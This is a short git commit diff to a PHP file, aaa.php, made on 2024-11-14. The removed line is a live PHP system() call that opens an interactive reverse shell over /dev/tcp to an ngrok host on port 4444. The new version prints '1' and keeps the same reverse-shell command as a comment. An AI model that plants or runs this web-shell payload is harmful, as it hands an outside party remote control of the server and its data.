870d73317578411a51711d81deba9145920f936d
Salim Cabus <83632722+salimcabus@users.noreply.github.com>
2024-11-14 00:09:08 -0300

    Update aaa.php

--- aaa.php
+++ aaa.php
@@ -1,2 +1,3 @@
 <?php
-system("/bin/bash -c 'sh -i &> /dev/tcp/1fda-45-160-100-50.ngrok-free.app/4444' 0>&1")
+echo 1;
+#system("/bin/bash -c 'sh -i &> /dev/tcp/1fda-45-160-100-50.ngrok-free.app/4444' 0>&1")
